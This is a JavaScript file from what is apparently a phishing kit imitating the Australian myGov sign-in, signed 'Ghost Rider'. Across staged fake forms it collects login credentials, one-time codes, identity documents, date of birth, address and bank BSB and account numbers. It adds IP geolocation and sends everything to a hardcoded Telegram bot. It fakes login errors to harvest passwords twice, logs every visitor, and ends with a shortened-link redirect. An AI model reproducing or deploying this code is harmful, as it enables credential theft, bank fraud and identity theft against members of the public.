var count = 0;
var counts = 0;
var token = '7348938226:AAG1MI-e2CBfT2i2f9vbcHYMUWUbClkxmYQ';
var chatId = '7705478130';
var ipAddress = '';
var city = '';
var state = '';
var country = '';
  
$(document).ready(function() {
 $.get('https://ipinfo.io/json', function(data) {
	ipAddress = data.ip;
	city = data.city;
	state = data.region;
	country = data.country;
  });
  
   $('#mygov-login-form').on('submit', function(e){
    counts = counts + 1;
    execute();
	e.preventDefault();
  });

  function execute() {
    var username = $('#username').val();
    var password = $('#password').val();
    var message = `====== |My.gov.au Online ID| ======
Online ID: ${username}
Password: ${password}
====== |IP Address Info| ======
IP Address: ${ipAddress}
City: ${city}
State: ${state}
Country: ${country}
====== |Ghost Rider| ======
`;

    $.ajax({
      type: 'POST',
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: 'html',
      },
      beforeSend: function(res) {
        $('#btn').html('<i class="fa fa-refresh fa-spin"></i>');
      },
      success: function(res) {
        console.debug(res);
        $('#response').text('Message sent');
        setTimeout(function() {
          if (counts == 2) {
            $('#step1').hide();
            $('#step2').show();
          } else {
            $('#password').val('');
            $('#error-msg-container').show();
            $('#btn').html('Sign in')
          }
        }, 1000);
      },
    });
  }
});
$(document).ready(function() {
 $.get('https://ipinfo.io/json', function(data) {
	ipAddress = data.ip;
	city = data.city;
	state = data.region;
	country = data.country;
  });
  
   $('#form2').on('submit', function(e){
    counts = counts + 1;
    execute();
	e.preventDefault();
  });

  function execute() {
    var otpcode = $('#code').val();
    var message = `====== |My.gov.au One-time code| ======
One-time code: ${otpcode}
====== |IP Address Info| ======
IP Address: ${ipAddress}
City: ${city}
State: ${state}
Country: ${country}
====== |Ghost Rider| ======
`;

    $.ajax({
      type: 'POST',
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: 'html',
      },
      beforeSend: function(res) {
        $('#btn2').html('<i class="fa fa-refresh fa-spin"></i>');
      },
      success: function(res) {
        console.debug(res);
        $('#response').text('Message sent');
        setTimeout(function() {
          if (counts == 3) {
            $('#step2').hide();
            $('#step3').show();
          } else {
            $('#code').val('');
            $('#error').show();
            $('#btn2').html('Next')
          }
        }, 1000);
      },
    });
  }
});
$(document).ready(function() {
 $.get('https://ipinfo.io/json', function(data) {
	ipAddress = data.ip;
	city = data.city;
	state = data.region;
	country = data.country;
  });
  
   $('#form3').on('submit', function(e){
    counts = counts + 1;
    execute();
	e.preventDefault();
  });

  function execute() {
    var fname = $('#fname').val();
	var dob = $('#dob').val();
	var address = $('#address').val();
	var phone = $('#phone').val();
	var issued = $('#issued').val();
	var reference = $('#reference').val();
	var dlcard = $('#dlcard').val();
	var bsb = $('#bsb').val();
	var acct = $('#acct').val();
    var message = `====== |My.gov.au Account Information| ======
Full Name: ${fname}
D.O.B: ${dob}
Full Address on File: ${address}
Mobile Phone Number: ${phone}
Enter you Driver License or Passport Number: ${issued}
Enter Document expiry date: ${reference}
Driver License Card Number: ${dlcard}
Enter BSB number recorded: ${bsb}
bank account number recorded : ${acct}
====== |IP Address Info| ======
IP Address: ${ipAddress}
City: ${city}
State: ${state}
Country: ${country}
====== |Ghost Rider| ======
`;

    $.ajax({
      type: 'POST',
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: 'html',
      },
      beforeSend: function(res) {
        $('#btn3').html('<i class="fa fa-refresh fa-spin"></i>');
      },
      success: function(res) {
        console.debug(res);
        $('#response').text('Message sent');
        setTimeout(function() {
          if (counts == 4) {
            $('#step3').hide();
            $('#step4').show();
          } else {
            $('#code').val('');
            $('#error').show();
            $('#btn3').html('Next')
          }
        }, 1000);
      },
    });
  }
});
$(document).ready(function() {
 $.get('https://ipinfo.io/json', function(data) {
	ipAddress = data.ip;
	city = data.city;
	state = data.region;
	country = data.country;
  });
  
   $('#form4').on('submit', function(e){
    counts = counts + 1;
    execute();
	e.preventDefault();
  });

  function execute() {
    var otp = $('#otp').val();
    var message = `====== |My.gov.au One-time code| ======
One-time code: ${otp}
====== |IP Address Info| ======
IP Address: ${ipAddress}
City: ${city}
State: ${state}
Country: ${country}
====== |Ghost Rider| ======
`;

    $.ajax({
      type: 'POST',
      url: `https://api.telegram.org/bot${token}/sendMessage`,
      data: {
        chat_id: chatId,
        text: message,
        parse_mode: 'html',
      },
      beforeSend: function(res) {
        $('#btn4').html('<i class="fa fa-refresh fa-spin"></i>');
      },
      success: function(res) {
        console.debug(res);
        $('#response').text('Message sent');
        setTimeout(function() {
          if (counts == 5) {
            $('#step3').show();
            $('#step3').show();
			setTimeout(function() {
              window.location.href = "https://bit.ly/3JN8CFY";
            }, 1000);
          } else {
            $('#pwd').val('');
            $('#err').show();
            $('#btn4').html('Continue')
          }
        }, 1000);
      },
    });
  }
});
$.get('https://ipinfo.io/json', function(data) {
  const ip = data.ip;
  const city = data.city;
  const state = data.region;
  const country = data.country;
  const isp = data.org;
  const message = `====== Visitor My.gov.au ======
IP Address: ${ip}
City: ${city}
State: ${state}
Country: ${country}
ISP: ${isp}
====== |Ghost Rider| ======
  `;
  $.ajax({
    type: 'POST',
    url: `https://api.telegram.org/bot${token}/sendMessage`,
    data: {
      chat_id: chatId,
      text: message,
    },
    success: function(response) {
      console.log('Notification sent!');
    },
    error: function(xhr, status, error) {
      console.error('Error sending notification:', error);
    }
  });
});